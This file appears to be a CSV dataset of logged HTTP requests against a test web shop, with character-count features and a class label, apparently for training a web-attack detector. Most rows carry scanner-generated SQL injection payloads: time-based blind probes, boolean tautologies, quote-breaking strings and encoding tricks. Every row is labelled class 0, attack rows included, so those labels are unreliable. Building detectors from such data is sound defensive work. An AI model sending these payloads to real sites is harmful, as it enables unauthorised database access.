method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'/AJAX/showxml.php',"b'<xml><node name=""YuoZQNxK"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',"b""addcart=NktdwUEp'));select%20pg_sleep(4);%20--%20&price=500""",1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""1ACUSTART\\"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,2,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=1ACUSTART'%22aqx9nACUEND&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",1,1,0,0,3,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=-1);%20waitfor%20delay%20'0:0:6'%20--%20""",b'',2,0,1,0,5,2,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1);select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1 OR 2+89-89-1=0+0+0+1 -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,6,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">1ACUSTART&apos;&quot;wo358ACUEND</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',b'addcart=3&price=800',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=hFYyiUlU&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,3,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1ACUSTART%20ACUEND&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,4,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=-1));%20waitfor%20delay%20'0:0:12'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1 OR 2+52-52-1=0+0+0+1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,4,0,0
GET,b'/hpp/params.php?aaaa=&p=1&pp=-1));select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">1ACUSTART ACUEND</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,3,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=-1%20OR%202%2b206-206-1%3d0%2b0%2b0%2b1%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,0,7,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1ACUSTART%5c&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,3,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=1%20waitfor%20delay%20'0:0:12'%20--%20""",b'',2,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 2+872-872-1=0+0+0+1 -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,6,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=MaFZoh4a';select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">1ACUSTART\\</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',b'addcart=8iX7BVPF&price=800',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=-1%20OR%202%2b763-763-1%3d0%2b0%2b0%2b1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,5,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=1&name=1ACUSTART'%22E8aNsACUEND&phpaction=echo $_POST[comment];&Submit=Submit""",1,1,0,0,1,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 3+872-872-1=0+0+0+1 -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,6,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=UnJwhcs0';%20waitfor%20delay%20'0:0:12'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=NYLKXR9j');select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""1ACUSTART&apos;&quot;4zqPtACUEND"">nodetext2</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',b'addcart=-1%20OR%202%2b834-834-1%3d0%2b0%2b0%2b1%20--%20&price=800',0,0,1,0,4,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=-1'%20OR%202%2b741-741-1%3d0%2b0%2b0%2b1%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",1,0,1,0,7,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=1ACUSTART%20ACUEND&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,2,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 3*2&lt;(0+5+872-872) -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,1,6,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=utXj1TgL');%20waitfor%20delay%20'0:0:18'%20--%20""",b'',3,0,1,0,5,2,0
GET,"b""/hpp/params.php?aaaa=&p=1&pp=GtyjWvdy'));select%20pg_sleep(9);%20--%20""",b'',1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""1ACUSTART ACUEND"">nodetext2</node></xml>'",0,4,0,0,3,0,0
POST,b'/cart.php',b'addcart=-1%20OR%202%2b158-158-1%3d0%2b0%2b0%2b1&price=800',0,0,0,0,2,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=-1'%20OR%202%2b968-968-1%3d0%2b0%2b0%2b1%20or%20'HZ5ducC6'%3d'&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",4,0,0,0,7,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=1ACUSTART%5c&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,1,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 3*2&gt;(0+5+872-872) -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,1,6,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=sjfDc4ut'));%20waitfor%20delay%20'0:0:18'%20--%20""",b'',3,0,1,0,5,2,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""1ACUSTART\\"">nodetext2</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',"b""addcart=-1'%20OR%202%2b853-853-1%3d0%2b0%2b0%2b1%20--%20&price=800""",1,0,1,0,4,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=-1%22%20OR%202%2b525-525-1%3d0%2b0%2b0%2b1%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,1,1,0,7,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=1&name=<your name here>&phpaction=1ACUSTART'%225ICnmACUEND&Submit=Submit""",1,1,0,0,2,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 2+33-33-1=0+0+0+1 or &apos;qnSzLAp3&apos;=&apos;"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,6,0,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=-1;select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">1ACUSTART&apos;&quot;KPFqRACUEND</node></xml>'",0,4,0,0,2,0,0
POST,b'/cart.php',"b""addcart=-1'%20OR%202%2b351-351-1%3d0%2b0%2b0%2b1%20or%20'Ji4qNQSi'%3d'&price=800""",4,0,0,0,4,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*/&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",2,2,0,14,3,3,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=<your name here>&phpaction=1ACUSTART%20ACUEND&Submit=Submit',0,0,0,0,3,0,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 3+33-33-1=0+0+0+1 or &apos;qnSzLAp3&apos;=&apos;"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,0,6,0,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=-1);select%20pg_sleep(6);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Ixe5PKvm/color-printer/3/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">1ACUSTART ACUEND</node></xml>'",0,4,0,0,3,0,0
POST,b'/cart.php',b'addcart=-1%22%20OR%202%2b209-209-1%3d0%2b0%2b0%2b1%20--%20&price=800',0,1,1,0,4,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",2,2,0,15,3,9,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=<your name here>&phpaction=1ACUSTART%5c&Submit=Submit',0,0,0,0,2,0,0
GET,b'/Mod_Rewrite_Shop/Details/color-printer/3/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 3*2&lt;(0+5+33-33) or &apos;qnSzLAp3&apos;=&apos;"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,1,6,0,0
GET,b'/showimage.php?file=./pictures/2.jpg&size=-1));select%20pg_sleep(12);%20--%20',b'',0,0,1,1,3,2,0
GET,b'/',b'',0,0,0,0,0,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">1ACUSTART\\</node></xml>'",0,4,0,0,2,0,0
GET,"b""/Mod_Rewrite_Shop/Details'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'kyys'%3d'kyys/color-printer/3/""",b'',4,0,0,0,4,0,0
POST,b'/cart.php',"b""addcart=if(now()%3dsysdate()%2csleep(10)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(10)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(10)%2c0))OR%22*/&price=800""",2,2,0,14,0,3,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=-1;%20waitfor%20delay%20'0:0:6'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",2,0,1,0,8,2,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=1ACUSTART'%22cz1ZgACUEND""",1,1,0,0,3,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&apos; OR 3*2&gt;(0+5+33-33) or &apos;qnSzLAp3&apos;=&apos;"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,1,6,0,0
GET,"b""/Mod_Rewrite_Shop/1'%22/color-printer/3/""",b'',1,1,0,0,0,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=gMxrCaEk';select%20pg_sleep(12);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/artists.php?artist=3',b'',0,0,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details%22%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20%22P3GP%22%3d%22P3GP/color-printer/3/',b'',0,4,0,0,4,0,0
POST,b'/cart.php',"b""addcart=(select(0)from(select(sleep(15)))v)/*'%2b(select(0)from(select(sleep(15)))v)%2b'%22%2b(select(0)from(select(sleep(15)))v)%2b%22*/&price=800""",2,2,0,15,0,9,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=-1);%20waitfor%20delay%20'0:0:9'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",2,0,1,0,8,2,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=1ACUSTART%20ACUEND',0,0,0,0,4,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&quot; OR 2+763-763-1=0+0+0+1 -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,6,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=hZzAivqP');select%20pg_sleep(18);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/%5c/color-printer/3/',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/Details%25'%20AND%202%2b1-1-1%3d0%2b0%2b0%2b1%20AND%20'tbVO'%21%3d'tbVO%25/color-printer/3/""",b'',4,0,0,0,4,0,0
POST,b'/cart.php',"b""addcart=-1;%20waitfor%20delay%20'0:0:15'%20--%20&price=800""",2,0,1,0,5,2,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=-1));%20waitfor%20delay%20'0:0:9'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",2,0,1,0,8,2,0
POST,b'/comment.php?aid=1&pid=1',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=1ACUSTART%5c',0,0,0,0,3,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&quot; OR 3+763-763-1=0+0+0+1 -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,6,0,0
GET,"b""/showimage.php?file=./pictures/2.jpg&size=U3XF602b'));select%20pg_sleep(6);%20--%20""",b'',1,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/1%00%c0%a7%c0%a2/color-printer/3/',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/artists.php?artist=fRB6A7Lo',b'',0,0,0,0,0,0,0
POST,b'/cart.php',"b""addcart=-1);%20waitfor%20delay%20'0:0:5'%20--%20&price=800""",2,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/if(now()%3dsysdate()%2csleep(3)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(3)%2c0))OR%22*//color-printer/3/""",b'',2,2,0,14,0,3,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=1%20waitfor%20delay%20'0:0:3'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",2,0,1,0,8,2,0
POST,"b""/comment.php?aid=1ACUSTART'%22ioOk2ACUEND&pid=1""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,1,0,0,3,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&quot; OR 3*2&lt;(0+5+763-763) -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,1,6,0,0
GET,b'/Mod_Rewrite_Shop/%40%40iH2CW/color-printer/3/',b'',0,0,0,0,0,0,0
GET,b'/showimage.php?file=./pictures/7.jpg&size=160',b'',0,0,0,0,0,0,0
GET,b'/',b'',0,0,0,0,0,0,0
GET,b'/artists.php?artist=0%2b0%2b0%2b3',b'',0,0,0,0,0,0,0
POST,b'/cart.php',"b""addcart=-1));%20waitfor%20delay%20'0:0:10'%20--%20&price=800""",2,0,1,0,5,2,0
GET,"b""/Mod_Rewrite_Shop/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*//color-printer/3/""",b'',2,2,0,15,0,9,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=k3PyUz17';%20waitfor%20delay%20'0:0:6'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",3,0,1,0,8,2,0
POST,b'/comment.php?aid=1ACUSTART%20ACUEND&pid=1',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,4,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""-1&quot; OR 3*2&gt;(0+5+763-763) -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,1,6,0,0
GET,b'/Mod_Rewrite_Shop/JyI%3d/color-printer/3/',b'',0,0,0,0,0,0,0
GET,"b""/artists.php?artist=1ACUSTART'%22D3gzHACUEND""",b'',1,1,0,0,0,0,0
POST,b'/cart.php',"b""addcart=1%20waitfor%20delay%20'0:0:10'%20--%20&price=800""",2,0,1,0,5,2,0
GET,b'/artists.php?artist=0%2b609*604%2b3',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=9trKz9cB');%20waitfor%20delay%20'0:0:6'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",3,0,1,0,8,2,0
GET,"b""/Mod_Rewrite_Shop/1%20waitfor%20delay%20'0:0:6'%20--%20/color-printer/3/""",b'',2,0,1,0,5,2,0
POST,b'/comment.php?aid=1ACUSTART%5c&pid=1',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,3,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""if(now()=sysdate(),sleep(9),0)/*&apos;XOR(if(now()=sysdate(),sleep(9),0))OR&apos;&quot;XOR(if(now()=sysdate(),sleep(9),0))OR&quot;*/"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,14,2,3,0
GET,"b""/Mod_Rewrite_Shop/%bf'%bf%22/color-printer/3/""",b'',1,1,0,0,0,0,0
GET,b'/comment.php?aid=1&pid=2',b'',0,0,0,0,0,0,0
POST,b'/cart.php',"b""addcart=vwanWPVO';%20waitfor%20delay%20'0:0:15'%20--%20&price=800""",3,0,1,0,5,2,0
GET,b'/artists.php?artist=13-5-2-999',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=NoJf7fFO'));%20waitfor%20delay%20'0:0:9'%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",3,0,1,0,8,2,0
GET,"b""/Mod_Rewrite_Shop/TYe4Yi6B';%20waitfor%20delay%20'0:0:9'%20--%20/color-printer/3/""",b'',3,0,1,0,5,2,0
POST,"b""/comment.php?aid=1&pid=1ACUSTART'%228NMrsACUEND""",b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',1,1,0,0,3,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""(select(0)from(select(sleep(9)))v)/*&apos;+(select(0)from(select(sleep(9)))v)+&apos;&quot;+(select(0)from(select(sleep(9)))v)+&quot;*/"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,0,15,2,9,0
GET,b'/showimage.php?file=./pictures/7.jpg&size=6df32wot',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/%f0''%f0%22%22/color-printer/3/""",b'',2,2,0,0,0,0,0
POST,b'/cart.php',"b""addcart=uhTm0oLL');%20waitfor%20delay%20'0:0:15'%20--%20&price=800""",3,0,1,0,5,2,0
GET,b'/artists.php?artist=13-5-2-3',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=-1;select%20pg_sleep(3);%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,1,6,2,0
GET,"b""/Mod_Rewrite_Shop/PaksYPoS');%20waitfor%20delay%20'0:0:3'%20--%20/color-printer/3/""",b'',3,0,1,0,5,2,0
POST,b'/comment.php?aid=1&pid=1ACUSTART%20ACUEND',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,4,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""1 waitfor delay &apos;0:0:3&apos; -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,7,2,0
GET,b'/Mod_Rewrite_Shop/(select%20convert(int%2cCHAR(65)))/color-printer/3/',b'',0,0,0,3,1,1,0
GET,b'/comment.php?aid=dIMAttF8&pid=2',b'',0,0,0,0,0,0,0
GET,b'/artists.php?artist=13-2*5%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
POST,b'/cart.php',"b""addcart=GrHeiyUK'));%20waitfor%20delay%20'0:0:5'%20--%20&price=800""",3,0,1,0,5,2,0
POST,b'/comment.php?aid=1&pid=1',b'comment=-1);select%20pg_sleep(3);%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,1,6,2,0
GET,b'/showimage.php?file=./pictures/7.jpg&size=-1%20OR%202%2b401-401-1%3d0%2b0%2b0%2b1%20--%20',b'',0,0,1,0,4,0,0
POST,b'/comment.php?aid=1&pid=1ACUSTART%5c',b'comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,0,0,3,0,0
GET,"b""/Mod_Rewrite_Shop/XRQbnhPF'));%20waitfor%20delay%20'0:0:3'%20--%20/color-printer/3/""",b'',3,0,1,0,5,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""oP5mMukN&apos;; waitfor delay &apos;0:0:6&apos; -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,7,2,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/',b'',0,0,0,0,0,0,0
GET,b'/comment.php?aid=-1%20OR%202%2b187-187-1%3d0%2b0%2b0%2b1%20--%20&pid=2',b'',0,0,1,0,4,0,0
POST,b'/cart.php',b'addcart=-1;select%20pg_sleep(10);%20--%20&price=800',0,0,1,1,3,2,0
GET,b'/artists.php?artist=13-2*6%2b0%2b0%2b1-1',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',b'comment=-1));select%20pg_sleep(6);%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit',0,0,1,1,6,2,0
GET,"b""/comment.php?aid=1ACUSTART'%22tVNgSACUEND&pid=2""",b'',1,1,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/GiUE4CUo';select%20pg_sleep(6);%20--%20/color-printer/3/""",b'',1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""v7g66am5&apos;); waitfor delay &apos;0:0:6&apos; -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,7,2,0
GET,b'/showimage.php?file=./pictures/7.jpg&size=-1%20OR%202%2b588-588-1%3d0%2b0%2b0%2b1',b'',0,0,0,0,2,0,0
GET,"b""/Mod_Rewrite_Shop/1'%22/network-attached-storage-dlink/1/""",b'',1,1,0,0,0,0,0
POST,b'/cart.php',b'addcart=-1);select%20pg_sleep(10);%20--%20&price=800',0,0,1,1,3,2,0
GET,b'/comment.php?aid=-1%20OR%202%2b711-711-1%3d0%2b0%2b0%2b1&pid=2',b'',0,0,0,0,2,0,0
GET,b'/artists.php?artist=3%20AND%202%2b1-1-1%3d1%20AND%20609%3d609',b'',0,0,0,0,4,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=pYxI3u7v';select%20pg_sleep(9);%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",1,0,1,1,6,2,0
POST,b'/comment.php',b'Submit=Submit&comment=1&name=<your%20name%20here>&phpaction=echo%20%24_POST%5bcomment%5d;',0,0,0,0,3,0,0
GET,"b""/Mod_Rewrite_Shop/9QlPYAGw');select%20pg_sleep(9);%20--%20/color-printer/3/""",b'',1,0,1,1,3,2,0
GET,b'/comment.php?aid=1ACUSTART%20ACUEND&pid=2',b'',0,0,0,0,1,0,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""tkwWlyhP&apos;)); waitfor delay &apos;0:0:9&apos; -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,0,7,2,0
POST,b'/cart.php',b'addcart=-1));select%20pg_sleep(15);%20--%20&price=800',0,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/%5c/network-attached-storage-dlink/1/',b'',0,0,0,0,0,0,0
GET,"b""/comment.php?aid=-1'%20OR%202%2b413-413-1%3d0%2b0%2b0%2b1%20--%20&pid=2""",b'',1,0,1,0,4,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=ijqV74ys');select%20pg_sleep(9);%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",1,0,1,1,6,2,0
GET,b'/artists.php?artist=3%20AND%203%2b1-1-1%3d1%20AND%20609%3d609',b'',0,0,0,0,4,0,0
GET,"b""/showimage.php?file=./pictures/7.jpg&size=-1'%20OR%202%2b273-273-1%3d0%2b0%2b0%2b1%20--%20""",b'',1,0,1,0,4,0,0
GET,b'/comment.php?aid=1ACUSTART%5c&pid=2',b'',0,0,0,0,0,0,0
GET,"b""/Mod_Rewrite_Shop/zwMFFI7A'));select%20pg_sleep(9);%20--%20/color-printer/3/""",b'',1,0,1,1,3,2,0
POST,b'/AJAX/showxml.php',"b'<xml><node name=""hqORkZen&apos;;select pg_sleep(3); -- "">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",0,4,1,1,5,2,0
POST,b'/cart.php',"b""addcart=CND0zMHr';select%20pg_sleep(5);%20--%20&price=800""",1,0,1,1,3,2,0
GET,b'/Mod_Rewrite_Shop/1%00%c0%a7%c0%a2/network-attached-storage-dlink/1/',b'',0,0,0,0,0,0,0
POST,b'/comment.php?aid=1&pid=1',"b""comment=3hVRb6pT'));select%20pg_sleep(3);%20--%20&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit""",1,0,1,1,6,2,0
GET,"b""/comment.php?aid=-1'%20OR%202%2b745-745-1%3d0%2b0%2b0%2b1%20or%20'mGMfE1BK'%3d'&pid=2""",b'',4,0,0,0,4,0,0
POST,b'/comment.php',b'Submit=Submit&comment=Arfg22Uj&name=<your%20name%20here>&phpaction=echo%20%24_POST%5bcomment%5d;',0,0,0,0,3,0,0
GET,b'/artists.php?artist=3%20AND%203*2%3d5%20AND%20609%3d609',b'',0,0,0,0,4,0,0
GET,"b""/comment.php?aid=1ACUSTART'%22YibV9ACUEND&pid=1""",b'',1,1,0,0,0,0,0
GET,b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/',b'',0,0,0,0,0,0,0
